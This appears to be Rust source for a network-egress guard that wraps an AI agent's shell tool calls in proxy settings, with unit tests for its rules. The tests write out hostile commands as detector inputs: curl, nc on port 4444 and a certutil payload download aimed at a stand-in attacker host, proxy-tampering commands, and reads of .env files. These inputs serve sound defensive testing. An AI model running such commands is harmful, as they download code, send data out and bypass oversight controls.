/// Text put in front of a command: `bash` (export statements) or `powershell` (`$env:` statements + the DefaultWebProxy line).
pub fn runtime_prefix(shell: &str, settings: &RuntimeSettings) -> String {
    let proxy = format!("http://127.0.0.1:{}", settings.port);
    let mut pairs: Vec<(String, String)> = Vec::new();
    for n in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"] {
        pairs.push((n.to_string(), proxy.clone()));
    }
    for n in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"] {
        pairs.push((n.to_lowercase(), proxy.clone()));
    }
    pairs.push(("NO_PROXY".into(), NO_PROXY_VALUE.into()));
    pairs.push(("no_proxy".into(), NO_PROXY_VALUE.into()));
    pairs.push(("NODE_USE_ENV_PROXY".into(), "1".into()));
    if !settings.allow_file.is_empty() {
        pairs.push(("LOOP_NETWORK_ALLOW_FILE".into(), settings.allow_file.clone()));
    }
    let require = if !settings.node_preload.is_empty() && !settings.allow_file.is_empty() { format!("--require \"{}\"", settings.node_preload) } else { String::new() };
    let python_path = if !settings.preload_dir.is_empty() && !settings.allow_file.is_empty() { settings.preload_dir.clone() } else { String::new() };
    let separator = if cfg!(windows) { ";" } else { ":" };
    if shell == "bash" {
        let mut words: Vec<String> = pairs.iter().map(|(n, v)| format!("{n}={}", sh_quote(v))).collect();
        if !python_path.is_empty() {
            words.push(format!("PYTHONPATH={}\"${{PYTHONPATH:+{separator}$PYTHONPATH}}\"", sh_quote(&python_path)));
        }
        if !require.is_empty() {
            words.push(format!("NODE_OPTIONS=\"${{NODE_OPTIONS:+$NODE_OPTIONS }}\"{}", sh_quote(&require)));
        }
        return format!("export {}\n", words.join(" "));
    }
    let mut statements: Vec<String> = pairs.iter().map(|(n, v)| format!("$env:{n}={}", ps_quote(v))).collect();
    if !python_path.is_empty() {
        statements.push(format!("$env:PYTHONPATH={} + $(if ($env:PYTHONPATH) {{ {} + $env:PYTHONPATH }} else {{ '' }})", ps_quote(&python_path), ps_quote(separator)));
    }
    if !require.is_empty() {
        statements.push(format!("$env:NODE_OPTIONS=$(if ($env:NODE_OPTIONS) {{ $env:NODE_OPTIONS + ' ' }} else {{ '' }}) + {}", ps_quote(&require)));
    }
    statements.push(format!("[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy({})", ps_quote(&proxy)));
    format!("{}\n", statements.join("; "))
}

/// The `updatedInput` of a Bash/PowerShell call: every original field plus `command` = prefix + original.
pub fn runtime_input(tool_name: &str, input: &Value, settings: &RuntimeSettings) -> Option<Value> {
    if tool_name != "Bash" && tool_name != "PowerShell" {
        return None;
    }
    let obj = input.as_object()?;
    let command = obj.get("command")?.as_str()?;
    if command.trim().is_empty() {
        return None;
    }
    let mut updated = obj.clone();
    updated.insert("command".into(), Value::String(format!("{}{}", runtime_prefix(if tool_name == "Bash" { "bash" } else { "powershell" }, settings), command)));
    Some(Value::Object(updated))
}

#[cfg(test)]
mod tests {
    use super::*;
    use cfg::Env;

    struct Project {
        _dir: tempfile::TempDir,
        root: String,
        g: G,
    }

    fn project(network: Option<&str>, env_test: Option<&str>) -> Project {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().display().to_string();
        std::fs::create_dir_all(dir.path().join(".specs/project")).unwrap();
        if let Some(n) = network {
            std::fs::write(dir.path().join(".specs/project/NETWORK.json"), n).unwrap();
        }
        if let Some(e) = env_test {
            std::fs::write(dir.path().join(".specs/project/.env.test"), e).unwrap();
        }
        let data = dir.path().join("data");
        std::fs::create_dir_all(&data).unwrap();
        let g = G::new(Env::from_pairs([("LOOP_DATA_DIR", data.display().to_string()), ("USERPROFILE", dir.path().display().to_string())]));
        Project { _dir: dir, root, g }
    }

    fn hits(p: &Project, command: &str) -> Vec<(String, String)> {
        let root = normalize_path(&p.g, &p.root, None, None);
        let mut ctx = Ctx::new(&p.g, &root, vec![root.clone()], Some(&root));
        command_hits(&mut ctx, command, &RULES)
    }

    fn rules_of(h: &[(String, String)]) -> Vec<&str> {
        h.iter().map(|(r, _)| r.as_str()).collect()
    }

    #[test]
    fn unlisted_host_is_blocked_and_listed_host_passes() {
        let p = project(Some(r#"{"allow": ["api.example.com"]}"#), None);
        assert_eq!(rules_of(&hits(&p, "curl https://evil.example.org/x")), vec!["egress-host"]);
        assert!(hits(&p, "curl https://api.example.com/x").is_empty());
        assert!(hits(&p, "curl http://localhost:3000/x").is_empty());
    }

    #[test]
    fn variables_and_subshells_are_unprovable() {
        let p = project(None, Some("API_URL=https://api.example.com\n"));
        assert!(hits(&p, "curl $TARGET").iter().any(|(_, r)| r.contains("variable")));
        assert!(hits(&p, "curl $(cat url.txt)").iter().any(|(_, r)| r.contains("sub-shell")));
        let ok = project(Some(r#"{"allow": ["api.example.com"]}"#), Some("API_URL=https://api.example.com\n"));
        assert!(hits(&ok, "curl $API_URL/x").is_empty());
    }

    #[test]
    fn tamper_is_detected() {
        let p = project(None, None);
        assert!(rules_of(&hits(&p, "export HTTP_PROXY=")).contains(&"egress-tamper"));
        assert!(rules_of(&hits(&p, "env -i node app.js")).contains(&"egress-tamper"));
        assert!(rules_of(&hits(&p, "curl --noproxy '*' http://localhost")).contains(&"egress-tamper"));
        assert!(rules_of(&hits(&p, "PYTHONPATH=$PYTHONPATH:src python x.py")).is_empty());
    }

    #[test]
    fn other_network_tools_are_judged() {
        let p = project(None, None);
        assert_eq!(rules_of(&hits(&p, "nc evil.example.org 4444")), vec!["egress-host"]);
        assert_eq!(rules_of(&hits(&p, "ssh user@evil.example.org")), vec!["egress-host"]);
        assert!(hits(&p, "nc -l 8080").is_empty());
        assert!(hits(&p, "ssh user@localhost").is_empty());
        assert_eq!(rules_of(&hits(&p, "certutil -urlcache -f https://evil.example.org/a.exe a.exe")), vec!["egress-host"]);
    }

    #[test]
    fn inline_code_urls_are_judged() {
        let p = project(None, None);
        assert_eq!(rules_of(&hits(&p, "python -c \"import urllib.request as u; u.urlopen('https://evil.example.org')\"")), vec!["egress-host"]);
        assert!(hits(&p, "python -c \"print('hello')\"").is_empty());
    }

    #[test]
    fn env_files_follow_the_project_boundary() {
        let p = project(None, None);
        let outside = hits(&p, "cat ../.env");
        assert!(rules_of(&outside).contains(&"env-file"));
        assert!(hits(&p, "cat .env.example").is_empty());
        assert!(rules_of(&hits(&p, "cat .specs/project/.env.test")).contains(&"env-file"));
    }

    #[test]
    fn echo_text_is_not_a_command() {
        let p = project(None, None);
        assert!(hits(&p, "echo 'curl https://evil.example.org'").is_empty());
        assert!(!hits(&p, "echo \"$(curl https://evil.example.org)\"").is_empty());
    }

    #[test]
    fn runtime_prefix_shapes() {
        let s =
            RuntimeSettings { port: 4711, degraded: false, allow_file: "C:/x/allow.json".into(), preload_dir: "C:/p".into(), node_preload: "C:/p/preload.cjs".into() };
        let bash = runtime_prefix("bash", &s);
        assert!(bash.starts_with("export HTTP_PROXY='http://127.0.0.1:4711'"));
        assert!(bash.contains("LOOP_NETWORK_ALLOW_FILE='C:/x/allow.json'"));
        let ps = runtime_prefix("powershell", &s);
        assert!(ps.contains("[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('http://127.0.0.1:4711')"));
    }
}
